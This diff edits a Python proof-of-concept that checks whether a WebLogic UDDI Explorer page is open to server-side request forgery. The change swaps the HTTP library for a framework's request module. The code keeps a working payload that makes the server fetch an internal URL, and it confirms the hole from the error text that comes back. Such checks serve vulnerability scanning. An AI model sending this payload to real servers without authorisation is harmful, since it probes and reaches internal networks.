@@ -6,7 +6,7 @@ referer: http://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-20
 description: weblogic 版本10.0.2 -- 10.3.6中SearchPublicRegistries.jsp，参数operator可传入内网IP造成SSRF漏洞
 '''
 import sys
-import requests
+from lib.core.Request import request
 
 
 def poc(url):
@@ -16,7 +16,7 @@ def poc(url):
     payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
     vulnurl = url + payload
     try:
-        req = requests.get(vulnurl, headers=headers, timeout=10)
+        req = request.get(vulnurl, headers=headers, timeout=10)
         if r"weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and r"IO Exception on sendMessage" not in req.text:
             return True
         else:
